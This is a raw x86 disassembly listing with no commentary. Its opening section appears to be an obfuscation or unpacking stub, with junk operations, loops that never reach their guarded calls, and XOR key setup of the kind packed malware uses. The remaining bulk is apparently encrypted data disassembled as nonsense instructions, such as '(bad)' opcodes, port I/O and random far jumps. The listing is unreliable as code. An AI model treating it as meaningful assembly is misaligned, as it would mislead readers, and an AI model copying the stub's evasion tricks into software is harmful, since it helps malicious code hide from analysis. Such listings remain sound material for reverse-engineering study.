  419e89:	sbb    ecx,DWORD PTR ds:0x42c008
  419e8f:	mov    ecx,0x3b4b
  419e94:	add    ax,cx
  419e97:	not    ecx
  419e99:	movzx  eax,ax
  419e9c:	mov    DWORD PTR [ebp-0x18],eax
  419e9f:	mov    BYTE PTR [ebp-0x1],0x61
  419ea3:	sub    DWORD PTR ds:0x429018,edi
  419ea9:	lea    eax,[ebp-0x1]
  419eac:	mov    DWORD PTR [ebp-0x10],eax
  419eaf:	mov    al,BYTE PTR [ebp-0x1]
  419eb2:	mov    DWORD PTR ds:0x42b018,0x13
  419ebc:	cmp    DWORD PTR ds:0x42b018,0x0
  419ec3:	je     0x419f16
  419ec9:	cmp    DWORD PTR ds:0x42b018,0x1f
  419ed0:	jne    0x419efe
  419ed6:	push   0x7696
  419edb:	push   0x42c01c
  419ee0:	push   0x4031
  419ee5:	push   0x429010
  419eea:	push   0x1f96
  419eef:	push   DWORD PTR [ebp-0x18]
  419ef2:	push   DWORD PTR [ebp-0x20]
  419ef5:	push   DWORD PTR [ebp-0x1c]
  419ef8:	call   DWORD PTR ds:0x424018
  419efe:	mov    ecx,DWORD PTR ds:0x42b018
  419f04:	dec    ecx
  419f05:	mov    DWORD PTR ds:0x42b018,ecx
  419f0b:	jmp    0x419ebc
  419f10:	sub    DWORD PTR ds:0x428008,ecx
  419f16:	mov    ecx,DWORD PTR [ebp-0x10]
  419f19:	xor    al,0x6f
  419f1b:	adc    DWORD PTR ds:0x429004,0x428004
  419f25:	sub    al,0xd
  419f27:	mov    BYTE PTR [ecx],al
  419f29:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  419f30:	and    DWORD PTR ds:0x428010,0x0
  419f3a:	jmp    0x419f4c
  419f3f:	mov    ecx,DWORD PTR ds:0x428010
  419f45:	inc    ecx
  419f46:	mov    DWORD PTR ds:0x428010,ecx
  419f4c:	cmp    DWORD PTR ds:0x428010,0x12
  419f53:	jae    0x419f77
  419f59:	cmp    DWORD PTR ds:0x428010,0x22
  419f60:	jne    0x419f71
  419f66:	push   0x80ee
  419f6b:	call   DWORD PTR ds:0x42401c
  419f71:	jmp    0x419f3f
  419f76:	inc    eax
  419f77:	push   ebx
  419f78:	and    DWORD PTR ds:0x428020,0x0
  419f82:	mov    eax,ds:0x428020
  419f87:	inc    eax
  419f88:	mov    ds:0x428020,eax
  419f8d:	cmp    DWORD PTR ds:0x428020,0x21
  419f94:	jne    0x419fa8
  419f9a:	push   0x12b4
  419f9f:	push   DWORD PTR [ebp-0xc]
  419fa2:	call   DWORD PTR ds:0x424020
  419fa8:	cmp    DWORD PTR ds:0x428020,0x16
  419faf:	jb     0x419f82
  419fb5:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  419fbc:	sub    eax,0x5057
  419fc1:	mov    ecx,DWORD PTR [ebp-0x14]
  419fc4:	xor    DWORD PTR ds:0x42a010,0x31a
  419fce:	push   esi
  419fcf:	and    DWORD PTR ds:0x42801c,0x42b000
  419fd9:	mov    eax,0x7510893
  419fde:	xor    ecx,eax
  419fe0:	mov    esi,0x3272db
  419fe5:	push   edi
  419fe6:	add    ecx,esi
  419fe8:	jmp    0x41a00c
  419fed:	mov    DWORD PTR ds:0x428010,0x3a90
  419ff7:	mov    dl,BYTE PTR [ebp-0x1]
  419ffa:	mov    DWORD PTR ds:0x42b000,0x1f96
  41a004:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  41a00b:	inc    ecx
  41a00c:	mov    DWORD PTR ds:0x42b008,0x156a
  41a016:	cmp    ecx,0x40
  41a019:	mov    DWORD PTR ds:0x42b004,0x31d2
  41a023:	jb     0x419fed
  41a029:	sbb    edx,DWORD PTR ds:0x429018
  41a02f:	mov    edx,DWORD PTR [ebp-0x14]
  41a032:	dec    DWORD PTR ds:0x428028
  41a038:	xor    edx,eax
  41a03a:	add    edx,esi
  41a03c:	mov    DWORD PTR ds:0x42a00c,0x26bd
  41a046:	jmp    0x41c434
  41a04b:	mov    edi,DWORD PTR [ebp+0x8]
  41a04e:	jmp    0x41c3c9
  41a053:	ud1    esp,DWORD PTR [edx+edi*2-0x78941c5c]
  41a05b:	(bad)  
  41a05c:	mov    ch,0x8f
  41a05e:	std    
  41a05f:	pop    eax
  41a060:	sbb    eax,0x5f2394
  41a065:	popa   
  41a066:	bound  eax,QWORD PTR [edi+ebx*2]
  41a069:	bound  esp,QWORD PTR [edx-0x7f]
  41a06c:	xchg   DWORD PTR [edi],edi
  41a06e:	add    cl,BYTE PTR [eax]
  41a070:	cs mov cl,0xb6
  41a073:	clc    
  41a074:	push   ecx
  41a075:	lock fnsave [edi-0x73]
  41a079:	imul   eax,DWORD PTR [edi],0x8d244b59
  41a07f:	or     al,0xa2
  41a081:	mov    ecx,0x85c97a8
  41a086:	or     BYTE PTR [ebx+0x7a],bh
  41a089:	push   0x1346e1b6
  41a08e:	jmp    0xf37eb862
  41a093:	sbb    ebx,DWORD PTR [edx+0x1824fd84]
  41a099:	xchg   DWORD PTR [eax-0x3bf4d118],ebx
  41a09f:	and    eax,0x4abb8a7b
  41a0a4:	jp     0x41a0b3
  41a0a6:	add    al,0x59
  41a0a8:	inc    eax
  41a0a9:	cmp    ebx,DWORD PTR [ebp-0x1bb7cc1b]
  41a0af:	jle    0x41a0d6
  41a0b1:	outs   dx,DWORD PTR ds:[esi]
  41a0b2:	in     eax,dx
  41a0b3:	int3   
  41a0b4:	add    BYTE PTR [ebp+0xa5a2769],ch
  41a0ba:	or     eax,0xf3f578af
  41a0bf:	std    
  41a0c0:	xchg   esi,eax
  41a0c1:	mov    ds:0xc62f270b,eax
  41a0c6:	cmc    
  41a0c7:	jl     0x41a102
  41a0c9:	cmp    esp,0xde1cc121
  41a0cf:	mov    ecx,0x80a734f8
  41a0d4:	out    dx,eax
  41a0d5:	pop    edx
  41a0d6:	inc    ebp
  41a0d7:	test   eax,0x4ca17954
  41a0dc:	or     DWORD PTR [ecx+0x4b003509],eax
  41a0e2:	es retf 0xb8aa
  41a0e6:	jl     0x41a11c
  41a0e8:	jg     0x41a078
  41a0ea:	(bad)  
  41a0eb:	fwait
  41a0ec:	xor    esi,DWORD PTR [esi-0x17]
  41a0ef:	fdiv   QWORD PTR [edx+ebp*4]
  41a0f2:	push   eax
  41a0f3:	je     0x41a0ec
  41a0f5:	sbb    eax,0xdf1c6f84
  41a0fa:	rcr    DWORD PTR [eax],cl
  41a0fc:	popf   
  41a0fd:	xchg   edi,eax
  41a0fe:	sub    ebp,DWORD PTR [ecx-0x72c8ce58]
  41a104:	cld    
  41a105:	mov    cl,0xa8
  41a107:	pmaxsw mm1,mm5
  41a10a:	sbb    eax,0xe5ccd21f
  41a10f:	cld    
  41a110:	ins    BYTE PTR es:[edi],dx
  41a111:	sbb    bl,al
  41a113:	and    eax,0x7573c9f
  41a118:	cmp    al,0x69
  41a11a:	cmp    DWORD PTR [edi+ebp*8],edi
  41a11d:	and    ch,bh
  41a11f:	out    dx,eax
  41a120:	imul   ebx,esi,0x3
  41a123:	cmp    al,0xfd
  41a125:	in     al,0x24
  41a127:	mov    ds:0xb57fb7c9,al
  41a12c:	jle    0x41a1a3
  41a12e:	jne    0x41a1af
  41a130:	cmp    DWORD PTR [edx+0x2a],eax
  41a133:	add    al,0xfc
  41a135:	(bad)  [di-0x74]
  41a139:	jmp    0x5e8e:0xaa91d58
  41a140:	pop    eax
  41a141:	into   
  41a142:	mov    eax,0x36dfc7c3
  41a147:	mov    BYTE PTR [edi],al
  41a149:	xor    BYTE PTR [eax],dl
  41a14b:	mov    ds:0xcffbd8c6,eax
  41a150:	xchg   edx,eax
  41a151:	sbb    eax,DWORD PTR [ebx+esi*8+0x4c]
  41a155:	fild   DWORD PTR [ecx]
  41a157:	out    dx,eax
  41a158:	sub    DWORD PTR [esi],edi
  41a15a:	push   esi
  41a15b:	jo     0x41a14b
  41a15d:	mov    ecx,0x4c4eaa0b
  41a162:	sub    eax,0xdc660642
  41a167:	ret    
  41a168:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a169:	ret    0xa71d
  41a16c:	in     eax,dx
  41a16d:	cmp    BYTE PTR [eax-0x65],dl
  41a170:	sub    eax,0xb2b8f13b
  41a175:	jmp    0x4890:0xcbb83d26
  41a17c:	(bad)  
  41a17d:	ins    DWORD PTR es:[edi],dx
  41a17e:	in     eax,0x43
  41a180:	add    DWORD PTR [esp+edx*1-0x4c014d8b],0x4b3682a0
  41a18b:	inc    ecx
  41a18c:	std    
  41a18d:	inc    ecx
  41a18e:	test   eax,0xa170c9a6
  41a193:	leave  
  41a194:	jle    0x41a1c5
  41a196:	cmp    edi,DWORD PTR [ebp+eiz*4-0x4f288af]
  41a19d:	cmp    eax,0x488e8c78
  41a1a2:	out    0xf1,al
  41a1a4:	inc    esp
  41a1a5:	or     BYTE PTR [edi],0x13
  41a1a8:	in     al,dx
  41a1a9:	pop    edi
  41a1aa:	dec    esi
  41a1ab:	out    dx,al
  41a1ac:	cmp    edi,edx
  41a1ae:	mov    esi,0x3f8476ef
  41a1b3:	dec    ecx
  41a1b4:	sub    ebp,edi
  41a1b6:	loop   0x41a171
  41a1b8:	push   esi
  41a1b9:	addr16 sbb al,0x5b
  41a1bc:	xor    al,0xe4
  41a1be:	call   0xe86f0cb6
  41a1c3:	push   eax
  41a1c4:	scas   eax,DWORD PTR es:[edi]
  41a1c5:	mov    bl,0xe3
  41a1c7:	inc    ebx
  41a1c8:	aam    0x3c
  41a1ca:	push   edx
  41a1cb:	push   cs
  41a1cc:	syscall 
  41a1ce:	lods   al,BYTE PTR ds:[esi]
  41a1cf:	jle    0x41a1e5
  41a1d1:	aas    
  41a1d2:	push   cs
  41a1d3:	dec    ebx
  41a1d4:	sbb    ecx,ecx
  41a1d6:	and    DWORD PTR [ebx-0x2baa9425],0x4
  41a1dd:	test   BYTE PTR [ecx+0x28092c60],ah
  41a1e3:	retf   0x68e5
  41a1e6:	clc    
  41a1e7:	arpl   WORD PTR ds:0x152d198c,di
  41a1ed:	pushf  
  41a1ee:	push   ebx
  41a1ef:	mov    esi,0xab05aa5c
  41a1f4:	mov    ebx,0x23ec86ff
  41a1f9:	push   ebx
  41a1fa:	pop    edx
  41a1fb:	or     cl,BYTE PTR [edx-0x25b249f]
  41a201:	mov    edi,DWORD PTR [edx-0x5943c499]
  41a207:	and    eax,0x99168806
  41a20c:	pop    edi
  41a20d:	mov    WORD PTR [edi],?
  41a20f:	dec    eax
  41a210:	icebp  
  41a211:	and    eax,0x86522ef3
  41a216:	arpl   WORD PTR [eax-0x39c45470],bx
  41a21c:	cli    
  41a21d:	xchg   eax,ebx
  41a21f:	or     esp,esp
  41a221:	mov    DWORD PTR [edi+eiz*2+0x48],esp
  41a225:	sahf   
  41a226:	(bad)  
  41a227:	xor    BYTE PTR [edx+0x45],al
  41a22a:	(bad)  
  41a22b:	out    0x3,al
  41a22d:	or     ah,BYTE PTR [eax+eax*2+0x38]
  41a231:	add    ah,BYTE PTR [ebp-0x55ce6437]
  41a237:	inc    edi
  41a238:	pop    ebp
  41a23a:	out    dx,eax
  41a23b:	pop    esi
  41a23c:	imul   eax,edi,0xffffffab
  41a23f:	fsub   QWORD PTR [ebx+0x0]
  41a242:	sub    esi,DWORD PTR [esi+ecx*2-0x6d308ec9]
  41a249:	icebp  
  41a24a:	jns    0x41a29a
  41a24c:	stos   DWORD PTR es:[edi],eax
  41a24d:	adc    BYTE PTR [ecx+0xc],0x36
  41a251:	ins    BYTE PTR es:[edi],dx
  41a252:	push   esi
  41a253:	inc    edx
  41a254:	jp     0x41a1ef
  41a256:	int    0x87
  41a258:	aaa    
  41a259:	inc    ebx
  41a25a:	sbb    DWORD PTR [edx+0x7d],esp
  41a25d:	loopne 0x41a26d
  41a25f:	xor    DWORD PTR [esi+0x708e4044],esi
  41a265:	and    dh,bh
  41a267:	in     eax,dx
  41a268:	push   esp
  41a269:	push   ecx
  41a26a:	sub    BYTE PTR [esi-0x34cfc7b9],al
  41a270:	jg     0x41a299
  41a272:	loop   0x41a271
  41a274:	mov    edi,0xf2865ed2
  41a279:	add    eax,0x3b2ed43f
  41a27e:	mov    eax,DWORD PTR [ebx]
  41a280:	mov    eax,0x447f2756
  41a285:	mov    bh,0x5d
  41a287:	lahf   
  41a288:	push   ebp
  41a289:	addr16 dec ecx
  41a28b:	das    
  41a28c:	mov    ds:0x63544f84,eax
  41a291:	shl    BYTE PTR [ecx+0x1a209bd4],1
  41a297:	repnz and al,0x9e
  41a29a:	or     eax,0xbc52406e
  41a29f:	xchg   edx,eax
  41a2a0:	adc    dh,ch
  41a2a2:	(bad)  
  41a2a3:	mov    DWORD PTR [ebx+edx*8],esi
  41a2a6:	cmc    
  41a2a7:	dec    esp
  41a2a8:	pop    edi
  41a2a9:	mov    esi,0xafd27522
  41a2ae:	(bad)
  41a2b2:	jge    0x41a235
  41a2b4:	xchg   esi,eax
  41a2b5:	sbb    BYTE PTR [eax+ebx*1-0x28],cl
  41a2b9:	es xchg ebp,eax
  41a2bb:	ins    BYTE PTR es:[edi],dx
  41a2bc:	shl    BYTE PTR [esi-0x56],1
  41a2bf:	bound  edi,QWORD PTR ds:0x642a3bd1
  41a2c5:	jp     0x41a2e0
  41a2c7:	xchg   eax,ebx
  41a2c9:	out    0x5c,al
  41a2cb:	cli    
  41a2cc:	arpl   WORD PTR [edi-0x2d0bd0cd],cx
  41a2d2:	xor    BYTE PTR [ebx],ah
  41a2d4:	jmp    0xa379:0xda5380a2
  41a2db:	mov    ds:0xd7a8c0a4,eax
  41a2e0:	lea    ebx,[edi-0x11]
  41a2e3:	fadd   DWORD PTR [esi-0x566a2831]
  41a2e9:	cs jno 0x41a2e2
  41a2ec:	ss nop
  41a2ee:	sbb    cl,BYTE PTR [esi+ebx*4-0x42]
  41a2f2:	data16 jmp 0x41a331
  41a2f5:	inc    edx
  41a2f6:	stos   BYTE PTR es:[edi],al
  41a2f7:	sbb    al,0xea
  41a2f9:	mov    BYTE PTR [ebp-0x4c],dh
  41a2fc:	cmp    eax,DWORD PTR [edx-0x6b]
  41a2ff:	fcom   DWORD PTR [ecx+0x5968e296]
  41a305:	lahf   
  41a306:	push   0xd4628c2e
  41a30b:	xchg   edx,eax
  41a30c:	hlt    
  41a30d:	mov    esp,0x33aefbad
  41a312:	xor    eax,0xad4f4e31
  41a317:	jnp    0x41a2c5
  41a319:	pop    es
  41a31a:	add    edi,DWORD PTR [edi-0x12]
  41a31d:	inc    esp
  41a31e:	mov    edi,0xb498456d
  41a323:	xor    eax,0xccb78cc6
  41a328:	cld    
  41a329:	push   0x7a843aff
  41a32e:	cmp    eax,0x70d4db3f
  41a333:	ins    BYTE PTR es:[edi],dx
  41a334:	hlt    
  41a335:	in     al,dx
  41a336:	dec    BYTE PTR [esi+0x766b5859]
  41a33c:	dec    edi
  41a33d:	repnz jmp 0x87df:0xb476abc7
  41a345:	push   ss
  41a346:	adc    ebp,DWORD PTR [eax-0x482d67ed]
  41a34c:	ret    
  41a34d:	rcr    BYTE PTR [esi-0xe328ce2],0xef
  41a354:	and    ah,BYTE PTR [ecx]
  41a356:	je     0x41a2e9
  41a358:	loop   0x41a38a
  41a35a:	jmp    0xefe0dee5
  41a35f:	xor    ebp,0xffffffa4
  41a362:	push   ss
  41a363:	or     eax,0x90b0b4c
  41a368:	ja     0x41a385
  41a36a:	xchg   edx,edx
  41a36c:	ds add al,0x6f
  41a36f:	adc    ah,BYTE PTR ds:0x85d36385
  41a375:	out    dx,al
  41a376:	cmp    al,0x27
  41a378:	cmc    
  41a379:	stos   BYTE PTR es:[edi],al
  41a37a:	xor    DWORD PTR [ecx],ecx
  41a37c:	xchg   ecx,eax
  41a37d:	jb     0x41a345
  41a37f:	addr16 pop bp
  41a382:	inc    ecx
  41a383:	inc    ecx
  41a384:	xchg   ebp,eax
  41a385:	pop    ss
  41a386:	mov    dl,0x46
  41a388:	imul   esp,DWORD PTR [ecx],0xc0f9eb44
  41a38e:	clc    
  41a38f:	inc    edi
  41a390:	adc    ebx,0x28819f6c
  41a396:	(bad)  
  41a397:	(bad)  
  41a399:	push   eax
  41a39a:	xchg   esi,eax
  41a39b:	or     edi,eax
  41a39d:	jo     0x41a32c
  41a39f:	jo     0x41a3c9
  41a3a1:	sbb    bh,ah
  41a3a3:	xchg   edi,eax
  41a3a4:	pop    ss
  41a3a5:	in     eax,0x76
  41a3a7:	mov    esi,0xeba77c12
  41a3ac:	hlt    
  41a3ad:	clc    
  41a3ae:	ret    
  41a3af:	cs push ss
  41a3b1:	or     al,0xa9
  41a3b3:	push   edx
  41a3b4:	repz fdiv DWORD PTR [ebp-0x4b]
  41a3b8:	ins    DWORD PTR es:[edi],dx
  41a3b9:	aaa    
  41a3ba:	fs xchg esi,eax
  41a3bc:	adc    al,0x23
  41a3be:	out    dx,eax
  41a3bf:	push   edi
  41a3c0:	jne    0x41a3d5
  41a3c2:	mov    dh,BYTE PTR [esi+0x45]
  41a3c5:	mov    DWORD PTR [ebx],ebx
  41a3c7:	xlat   BYTE PTR ds:[ebx]
  41a3c8:	or     al,0x45
  41a3ca:	fisub  WORD PTR [ebx]
  41a3cc:	and    edi,esp
  41a3ce:	in     al,0x7c
  41a3d0:	int    0x82
  41a3d2:	out    dx,eax
  41a3d3:	(bad)  
  41a3d5:	add    esp,DWORD PTR [ebx]
  41a3d7:	xor    BYTE PTR [edi+0x7],0x5b
  41a3db:	stos   DWORD PTR es:[edi],eax
  41a3dc:	xchg   esp,eax
  41a3dd:	call   0xac40:0xa1bd1ef7
  41a3e4:	in     eax,dx
  41a3e5:	ret    
  41a3e6:	push   sp
  41a3e8:	push   ebx
  41a3e9:	scas   eax,DWORD PTR es:[edi]
  41a3ea:	ins    BYTE PTR es:[edi],dx
  41a3eb:	shl    BYTE PTR [ecx+0x58967f48],cl
  41a3f1:	div    DWORD PTR [ebx+0x16]
  41a3f4:	mov    bl,0xb4
  41a3f6:	xchg   edx,eax
  41a3f7:	out    dx,eax
  41a3f8:	mov    esi,0xf47686e2
  41a3fd:	(bad)  
  41a3fe:	lods   eax,DWORD PTR ds:[esi]
  41a3ff:	mov    edi,0xae291315
  41a404:	dec    edi
  41a405:	out    dx,eax
  41a406:	xor    BYTE PTR [edi],ch
  41a408:	add    bh,BYTE PTR [ebx+ebp*4+0x76296875]
  41a40f:	cmp    eax,0x61ff1fad
  41a414:	mov    bh,0x61
  41a416:	mov    BYTE PTR [eax-0xc168966],ah
  41a41c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a41d:	jecxz  0x41a427
  41a41f:	push   0xf865c221
  41a424:	pop    esp
  41a425:	xor    al,0x85
  41a427:	pop    esi
  41a428:	shl    DWORD PTR [esi+eax*8],0xc9
  41a42c:	mov    ds:0x727193e8,eax
  41a431:	jle    0x41a4a8
  41a433:	xor    BYTE PTR [ecx-0x3f],dl
  41a436:	and    DWORD PTR [ebx+ebx*4+0x7bd15509],esi
  41a43d:	aaa    
  41a43e:	fidivr DWORD PTR [edi+0x44ceda5c]
  41a444:	dec    ebp
  41a445:	push   esp
  41a446:	addr16 mov edi,0x5468e7da
  41a44c:	add    al,0x2f
  41a44e:	dec    ebx
  41a44f:	leave  
  41a450:	push   ebp
  41a451:	out    0xad,al
  41a453:	xor    al,0x8a
  41a455:	mov    dl,0x14
  41a457:	push   es
  41a458:	jmp    0xd723de3f
  41a45d:	push   ss
  41a45e:	or     esp,esp
  41a460:	sub    bl,BYTE PTR [esp+eax*1+0x3ae4808]
  41a467:	cmc    
  41a468:	or     DWORD PTR [ecx+ebp*1-0x5c6dc7bf],ecx
  41a46f:	inc    eax
  41a470:	push   edx
  41a471:	xchg   BYTE PTR ds:0xab43ee42,bl
  41a477:	or     eax,edi
  41a479:	sub    DWORD PTR [edx-0x9b18cf7],edx
  41a47f:	cmp    eax,0x6f62c722
  41a484:	push   0xffffffd8
  41a486:	aam    0x19
  41a488:	or     DWORD PTR [edi+0x7e],esp
  41a48b:	cmp    cl,BYTE PTR [ebp+0x78f97e43]
  41a491:	clc    
  41a492:	pop    ecx
  41a493:	jecxz  0x41a449
  41a495:	xor    DWORD PTR [eax-0x1624373f],edx
  41a49b:	xchg   DWORD PTR [ebx+0x1a72ee5],esi
  41a4a1:	sbb    al,0x8f
  41a4a3:	dec    esi
  41a4a4:	(bad)  
  41a4a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4a6:	enter  0x3c66,0xf6
  41a4aa:	pop    ds
  41a4ab:	inc    esi
  41a4ac:	add    BYTE PTR [ebx],bh
  41a4ae:	rol    ch,cl
  41a4b0:	sub    eax,0x7471b305
  41a4b5:	shr    DWORD PTR [edx],1
  41a4b7:	mov    bl,0x85
  41a4b9:	inc    esi
  41a4ba:	int3   
  41a4bb:	add    esi,ecx
  41a4bd:	push   esi
  41a4be:	xchg   esp,eax
  41a4bf:	cmp    BYTE PTR [edi+ebp*4+0x6321d6d1],dl
  41a4c6:	in     al,dx
  41a4c7:	add    DWORD PTR [ebx],0xffffff85
  41a4ca:	out    0x65,eax
  41a4cc:	test   eax,0x3586bb5b
  41a4d1:	imul   esi,DWORD PTR [edx-0xb3c03b9],0xffffffc8
  41a4d8:	gs pop ds
  41a4da:	scas   eax,DWORD PTR es:[edi]
  41a4db:	lock scas eax,DWORD PTR es:[edi]
  41a4dd:	push   ds
  41a4de:	out    dx,al
  41a4df:	pop    esi
  41a4e0:	add    bl,BYTE PTR [ebx-0x37eaba2c]
  41a4e6:	sti    
  41a4e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4e8:	sbb    al,0x87
  41a4ea:	(bad)  
  41a4eb:	mov    dl,0xb0
  41a4ed:	ja     0x41a4c3
  41a4ef:	pop    es
  41a4f0:	repz jae 0x41a565
  41a4f3:	pushf  
  41a4f4:	xchg   ch,al
  41a4f6:	mov    ds:0xaae0c685,al
  41a4fb:	adc    DWORD PTR [edi],edi
  41a4fd:	dec    edi
  41a4fe:	sahf   
  41a4ff:	push   edi
  41a500:	rcr    DWORD PTR [ebx+ecx*4+0x79],0x13
  41a505:	push   ebx
  41a506:	and    DWORD PTR [eax-0xb195848],0xac1abea6
  41a510:	adc    bl,bh
  41a512:	and    BYTE PTR [esi-0x2ce12dd6],bl
  41a518:	pop    ebp
  41a519:	push   ds
  41a51a:	xor    al,0xa3
  41a51c:	(bad)  
  41a51d:	retf   
  41a51e:	adc    eax,DWORD PTR cs:[edx+0x12ac942e]
  41a525:	out    0x17,eax
  41a527:	push   esp
  41a528:	or     BYTE PTR [ebp-0x75],bl
  41a52b:	and    BYTE PTR [esi],bl
  41a52d:	jb     0x41a544
  41a52f:	sbb    bl,BYTE PTR [ebp-0x2e]
  41a532:	div    DWORD PTR [esi+0xb]
  41a535:	shl    dh,1
  41a537:	pop    esp
  41a538:	sbb    edi,edx
  41a53a:	popf   
  41a53b:	mov    dl,0xfc
  41a53d:	mov    dh,0x59
  41a53f:	sub    al,0x1d
  41a541:	cmp    DWORD PTR [edx-0x1d825290],ecx
  41a547:	pusha  
  41a548:	call   0x16a321a5
  41a54d:	add    eax,0x29fa1e34
  41a552:	pop    ebp
  41a553:	int3   
  41a554:	pop    ecx
  41a555:	push   es
  41a556:	mov    BYTE PTR [ecx+0x2a],bh
  41a559:	jmp    0x41cc7cfb
  41a55e:	xor    eax,0x284ef27d
  41a563:	jecxz  0x41a52c
  41a565:	mov    cl,0xd4
  41a567:	(bad)  
  41a568:	fsub   st(2),st
  41a56a:	pop    ecx
  41a56b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a56c:	sbb    dh,BYTE PTR [edi-0x4fb4cec2]
  41a572:	push   esp
  41a573:	repz cmp dh,BYTE PTR [eax-0x51]
  41a577:	jmp    0x41a56e
  41a579:	in     al,dx
  41a57a:	jo     0x41a5d7
  41a57c:	bound  ebp,QWORD PTR [ecx+0x1c]
  41a57f:	cmp    DWORD PTR [edx-0x1cc6282d],edx
  41a585:	and    BYTE PTR [esi],bh
  41a587:	adc    eax,0x32591f53
  41a58c:	test   eax,0xbdb634b7
  41a591:	aam    0x34
  41a593:	jnp    0x41a55e
  41a595:	fisub  WORD PTR fs:[esi-0x7474560d]
  41a59c:	ins    BYTE PTR es:[edi],dx
  41a59d:	dec    esp
  41a59e:	(bad)  
  41a5a0:	aaa    
  41a5a1:	or     ch,BYTE PTR [edx+0x7c]
  41a5a4:	pop    ds
  41a5a5:	xchg   esi,eax
  41a5a6:	cmp    eax,0xd2b290e8
  41a5ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5ac:	das    
  41a5ad:	mov    ch,BYTE PTR [eax]
  41a5af:	add    ecx,DWORD PTR [esi-0x24913b4e]
  41a5b5:	lds    ebx,FWORD PTR [eax-0x257013ff]
  41a5bb:	ror    DWORD PTR [esi-0x17bad649],1
  41a5c1:	adc    dl,cl
  41a5c3:	test   DWORD PTR [ebx-0x2d],0x25c5544a
  41a5ca:	pop    ss
  41a5cb:	rol    al,0x1a
  41a5ce:	mov    dl,0x9f
  41a5d0:	mov    DWORD PTR ds:0xd1593541,ebp
  41a5d6:	add    edi,DWORD PTR ds:0x24b854d2
  41a5dc:	mov    eax,ds:0x595f05d
  41a5e1:	and    eax,0xc239d8c4
  41a5e6:	ins    DWORD PTR es:[edi],dx
  41a5e7:	(bad)  
  41a5e8:	scas   al,BYTE PTR es:[edi]
  41a5e9:	cli    
  41a5ea:	call   0xf0a:0x69172c6b
  41a5f1:	mov    ds:0x90a4d2c4,eax
  41a5f6:	push   edx
  41a5f7:	jne    0x41a5f1
  41a5f9:	mov    dl,0x10
  41a5fb:	lea    eax,[eax]
  41a5fd:	sbb    ch,BYTE PTR [ecx]
  41a5ff:	mov    bl,0x80
  41a601:	cmp    BYTE PTR ds:0x94983279,0xa8
  41a608:	das    
  41a609:	pop    ebx
  41a60a:	mov    ds:0x722aa0ca,eax
  41a60f:	and    ebx,DWORD PTR [esi-0x5b]
  41a612:	mov    esp,DWORD PTR [eax+0x39]
  41a615:	mov    WORD PTR [esi],ss
  41a617:	in     al,dx
  41a618:	fs nop
  41a61a:	lea    esp,[ebx+eiz*4-0x19]
  41a61e:	mov    eax,ds:0x1190cd74
  41a623:	adc    DWORD PTR [eax+0x43],ebp
  41a626:	mov    al,ds:0x7c1c3909
  41a62b:	jmp    0x7d04:0x69f4b7f1
  41a632:	mov    bl,0x5d
  41a634:	jmp    0x41a6a9
  41a636:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a637:	rol    DWORD PTR [esp+esi*1],1
  41a63a:	pop    ebx
  41a63b:	outs   dx,BYTE PTR ds:[esi]
  41a63c:	les    esi,FWORD PTR [eax*4-0xeafe878]
  41a643:	out    dx,al
  41a644:	call   0x66f31458
  41a649:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41a64b:	and    DWORD PTR [eax+eax*2],ecx
  41a64e:	and    BYTE PTR [ebp+0x3e36e4f2],al
  41a654:	lds    ebp,FWORD PTR [ecx-0x10121464]
  41a65a:	xlat   BYTE PTR ds:[ebx]
  41a65b:	out    0x17,eax
  41a65d:	cmp    eax,0x7926c5e4
  41a662:	mov    al,cs:0x1199a467
  41a668:	imul   DWORD PTR ds:0x7caa4ef5
  41a66e:	out    0x8e,al
  41a670:	mov    bl,0xde
  41a672:	inc    edx
  41a673:	push   es
  41a674:	xchg   ebx,eax
  41a675:	and    al,0xd6
  41a677:	sbb    bl,bl
  41a679:	rcl    ebp,cl
  41a67b:	popa   
  41a67c:	imul   edi,edx,0xffffff93
  41a67f:	push   ecx
  41a680:	dec    esi
  41a681:	mov    bh,0x7f
  41a683:	lea    eax,[edx+0x44]
  41a686:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a687:	push   es
  41a688:	cmp    edi,edi
  41a68a:	or     al,0x75
  41a68c:	add    DWORD PTR [eax+0x4c0cdd81],ebp
  41a692:	xchg   esi,eax
  41a693:	push   eax
  41a694:	jns    0x41a65e
  41a696:	nop
  41a697:	ror    bh,cl
  41a699:	xchg   edx,eax
  41a69a:	xchg   ebp,eax
  41a69b:	sbb    BYTE PTR [esp+ebp*8+0x299b7772],bh
  41a6a2:	(bad)  
  41a6a3:	or     edx,DWORD PTR [edx]
  41a6a5:	pop    edi
  41a6a6:	jle    0x41a6dd
  41a6a8:	repz bound esp,QWORD PTR [eax]
  41a6ab:	stc    
  41a6ac:	(bad)  
  41a6ad:	cmp    DWORD PTR [edi+0x56c280f],eax
  41a6b3:	adc    ebp,DWORD PTR [ecx-0x34]
  41a6b6:	std    
  41a6b7:	mov    ds:0x3663634c,al
  41a6bc:	fwait
  41a6bd:	or     BYTE PTR [edi+0xf07976b],dl
  41a6c3:	ret    
  41a6c4:	or     dh,BYTE PTR [ebp-0x39d3cf3a]
  41a6ca:	xlat   BYTE PTR ds:[ebx]
  41a6cb:	lahf   
  41a6cc:	xlat   BYTE PTR ds:[ebx]
  41a6cd:	lock xchg edi,eax
  41a6cf:	and    eax,0x6a4e3a67
  41a6d4:	adc    eax,0x1bab3b0f
  41a6d9:	xchg   ah,dl
  41a6db:	dec    edx
  41a6dc:	mov    cl,cl
  41a6de:	mov    edx,0x8a9e9b7
  41a6e3:	sbb    esi,eax
  41a6e5:	xchg   ecx,eax
  41a6e6:	add    DWORD PTR [esp+eiz*4],esi
  41a6e9:	xlat   BYTE PTR ds:[ebx]
  41a6ea:	rol    BYTE PTR [ebp-0x38f3f4ea],1
  41a6f0:	or     esp,DWORD PTR [ebp+ecx*1+0x9]
  41a6f4:	sar    BYTE PTR [edi],cl
  41a6f6:	call   0x48f0fc8f
  41a6fb:	enter  0x9eb2,0x76
  41a6ff:	test   eax,edi
